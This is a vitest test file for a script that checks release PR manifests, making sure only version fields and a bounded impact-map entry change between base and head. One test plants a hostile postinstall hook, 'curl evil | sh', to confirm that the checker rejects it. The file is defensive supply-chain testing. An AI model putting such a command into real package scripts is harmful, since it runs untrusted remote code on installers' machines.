// A release PR's manifests may differ from the base only in the version fields
// the release writes. Each case builds a throwaway git repository under the OS
// temp directory and runs the real `main()` against it through `--root`.
import { spawnSync } from 'node:child_process';
import { mkdtempSync, mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';

import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

import { main, manifestDifferences } from '../../src/scripts/check_release_manifest_content.js';

function git(cwd: string, args: string[]): void {
    const r = spawnSync('git', args, { cwd, encoding: 'utf8' });
    if (r.status !== 0) throw new Error(`git ${args.join(' ')}: ${r.stderr}`);
}

function writeJson(repo: string, rel: string, v: unknown): void {
    const abs = join(repo, rel);
    mkdirSync(dirname(abs), { recursive: true });
    writeFileSync(abs, `${JSON.stringify(v, null, 2)}\n`, 'utf8');
}

type Obj = Record<string, unknown>;

function readJson(repo: string, rel: string): Obj {
    return JSON.parse(readFileSync(join(repo, rel), 'utf8')) as Obj;
}

function at(o: Obj, ...keys: string[]): Obj {
    return keys.reduce<Obj>((acc, k) => acc[k] as Obj, o);
}

const V = '1.0.0';

function seed(repo: string): void {
    writeJson(repo, 'package.json', { name: 'x', version: V, scripts: { test: 'vitest' }, dependencies: { a: '^1.0.0' } });
    writeJson(repo, 'package-lock.json', {
        name: 'x',
        version: V,
        lockfileVersion: 3,
        packages: { '': { name: 'x', version: V }, 'node_modules/a': { version: '1.0.0' } },
    });
    writeJson(repo, '.claude-plugin/marketplace.json', { metadata: { version: V }, plugins: [{ name: 'p' }] });
    writeJson(repo, '.augment-plugin/plugin.json', { name: 'p', version: V });
    writeJson(repo, '.augment-plugin/marketplace.json', {
        version: V,
        metadata: { version: V },
        plugins: [{ name: 'p', version: V }],
    });
}

function bumpAll(repo: string, to: string): void {
    const pkg = readJson(repo, 'package.json');
    pkg['version'] = to;
    writeJson(repo, 'package.json', pkg);
    const lock = readJson(repo, 'package-lock.json');
    lock['version'] = to;
    at(lock, 'packages', '')['version'] = to;
    writeJson(repo, 'package-lock.json', lock);
    const cm = readJson(repo, '.claude-plugin/marketplace.json');
    at(cm, 'metadata')['version'] = to;
    writeJson(repo, '.claude-plugin/marketplace.json', cm);
    writeJson(repo, '.augment-plugin/plugin.json', { name: 'p', version: to });
    writeJson(repo, '.augment-plugin/marketplace.json', {
        version: to,
        metadata: { version: to },
        plugins: [{ name: 'p', version: to }],
    });
}

describe('check_release_manifest_content', () => {
    let repo: string;
    let out: string;

    beforeEach(() => {
        repo = mkdtempSync(join(tmpdir(), 'manifest-content-'));
        git(repo, ['init', '-q', '-b', 'main']);
        git(repo, ['config', 'user.email', 'test@example.com']);
        git(repo, ['config', 'user.name', 'test']);
        seed(repo);
        git(repo, ['add', '.']);
        git(repo, ['commit', '-qm', 'base']);
        out = '';
        vi.spyOn(process.stdout, 'write').mockImplementation((s: string | Uint8Array) => {
            out += String(s);
            return true;
        });
        vi.spyOn(process.stderr, 'write').mockImplementation(() => true);
    });

    afterEach(() => {
        vi.restoreAllMocks();
        rmSync(repo, { recursive: true, force: true });
    });

    it('passes a version bump across all five manifests', () => {
        bumpAll(repo, '1.1.0');
        expect(main(['--base', 'main', '--root', repo])).toBe(0);
        expect(out).toContain('scanned: 5');
    });

    it('fails an added script', () => {
        bumpAll(repo, '1.1.0');
        const pkg = readJson(repo, 'package.json');
        at(pkg, 'scripts')['postinstall'] = 'curl evil | sh';
        writeJson(repo, 'package.json', pkg);
        expect(main(['--base', 'main', '--root', repo])).toBe(1);
        expect(out).toContain('package.json: "scripts"."postinstall" differs outside the version fields');
    });

    it('fails an added dependency', () => {
        const pkg = readJson(repo, 'package.json');
        at(pkg, 'dependencies')['b'] = '^2.0.0';
        writeJson(repo, 'package.json', pkg);
        expect(main(['--base', 'main', '--root', repo])).toBe(1);
        expect(out).toContain('"dependencies"."b"');
    });

    it('fails a dependency version moved inside the lockfile — `version` is not matched by key name', () => {
        const lock = readJson(repo, 'package-lock.json');
        at(lock, 'packages', 'node_modules/a')['version'] = '1.0.1';
        writeJson(repo, 'package-lock.json', lock);
        expect(main(['--base', 'main', '--root', repo])).toBe(1);
        expect(out).toContain('"packages"."node_modules/a"."version"');
    });

    it('fails a non-string value written into a version field', () => {
        expect(manifestDifferences('package.json', '{"version":"1.0.0"}', '{"version":2}')).toEqual([
            'package.json: "version" differs outside the version fields',
        ]);
    });

    it('fails a manifest removed from the head', () => {
        rmSync(join(repo, '.augment-plugin/plugin.json'));
        expect(main(['--base', 'main', '--root', repo])).toBe(1);
        expect(out).toContain('.augment-plugin/plugin.json: removed');
    });

    it('refuses an unresolvable base with exit 2', () => {
        expect(main(['--base', 'no-such-ref', '--root', repo])).toBe(2);
    });
});

describe('the impact-map entry the release writes into package.json', () => {
    const base = (extra: Obj = {}): string => JSON.stringify({ name: 'x', version: '1.0.0', ...extra });
    const head = (extra: Obj = {}): string => JSON.stringify({ name: 'x', version: '2.0.0', ...extra });
    const entry = (impact: string, more: Obj = {}): Obj => ({ impact, ...more });

    it('passes the first entry, for the version being cut, on a base with no agentConfig', () => {
        expect(manifestDifferences('package.json', base(), head({ agentConfig: { impact: { '2.0.0': entry('notice') } } }))).toEqual([]);
    });

    it('passes a new entry beside the ones earlier releases wrote, security flag included', () => {
        const prior = { agentConfig: { impact: { '1.0.0': entry('action') } } };
        const next = { agentConfig: { impact: { '1.0.0': entry('action'), '2.0.0': entry('automatic', { security: true }) } } };
        expect(manifestDifferences('package.json', base(prior), head(next))).toEqual([]);
    });

    it('fails an entry keyed to a version other than the one being cut', () => {
        expect(manifestDifferences('package.json', base(), head({ agentConfig: { impact: { '9.9.9': entry('notice') } } }))).toEqual([
            'package.json: "agentConfig" differs outside the version fields',
        ]);
    });

    it('fails an edit to an entry an earlier release wrote', () => {
        const prior = { agentConfig: { impact: { '1.0.0': entry('action') } } };
        const next = { agentConfig: { impact: { '1.0.0': entry('none'), '2.0.0': entry('notice') } } };
        expect(manifestDifferences('package.json', base(prior), head(next))).toEqual([
            'package.json: "agentConfig"."impact"."1.0.0"."impact" differs outside the version fields',
        ]);
    });

    it('fails an out-of-vocabulary value and any other key under agentConfig', () => {
        expect(manifestDifferences('package.json', base(), head({ agentConfig: { impact: { '2.0.0': entry('huge') } } }))).toHaveLength(1);
        expect(manifestDifferences('package.json', base(), head({ agentConfig: { impact: { '2.0.0': entry('notice') }, other: 1 } }))).toHaveLength(1);
        expect(manifestDifferences('package.json', base(), head({ agentConfig: { impact: { '2.0.0': entry('notice', { extra: 1 }) } } }))).toHaveLength(1);
    });

    it('allows the entry only in package.json', () => {
        expect(manifestDifferences('.augment-plugin/plugin.json', base(), head({ agentConfig: { impact: { '2.0.0': entry('notice') } } }))).toHaveLength(1);
    });
});
